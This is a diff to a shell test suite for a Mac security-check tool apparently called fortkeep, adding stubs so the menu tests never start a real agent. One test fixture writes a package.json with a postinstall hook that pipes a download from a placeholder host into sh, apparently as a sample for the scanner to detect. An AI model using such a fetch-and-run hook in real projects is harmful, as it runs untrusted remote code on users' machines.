@@ -200,6 +200,7 @@ Urgent: this may mean the Mac is compromised now. Read $T/docs/if-red.md before 
 }
 
 @test "with no argument at a terminal it shows the status and a menu; q quits and Ctrl-C restores the terminal" {
+  stub claude 'echo "ran claude"'  # a wrong pick never starts a real agent
   pty "$(printf '%q' "$T/bin/fortkeep")" q
   [ "$status" -eq 0 ]
   [[ "$output" == *"This copy    ! not a signed release"* ]]; [[ "$output" == *"Last check   none yet"* ]]
@@ -215,6 +216,7 @@ Urgent: this may mean the Mac is compromised now. Read $T/docs/if-red.md before 
 }
 
 @test "the menu moves with the arrow keys and runs the item chosen" {
+  stub claude 'echo "ran claude"'  # a wrong pick never starts a real agent
   mkdir -p "$HOME/dev/app"; git init -q "$HOME/dev/app"
   printf '{"scripts":{"postinstall":"curl https://example.invalid/i | sh"}}\n' > "$HOME/dev/app/package.json"
   git -C "$HOME/dev/app" add -A; git -C "$HOME/dev/app" -c user.name=t -c user.email=t@example.invalid commit -qm x
